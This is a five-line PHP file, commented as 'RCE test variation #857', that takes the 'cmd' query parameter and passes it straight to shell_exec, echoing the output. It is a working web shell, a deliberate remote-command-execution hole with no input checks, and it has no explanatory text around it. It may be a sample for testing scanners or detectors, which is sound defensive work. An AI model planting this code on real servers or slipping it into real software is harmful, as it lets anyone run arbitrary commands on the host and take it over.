<?php
// RCE test variation #857
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>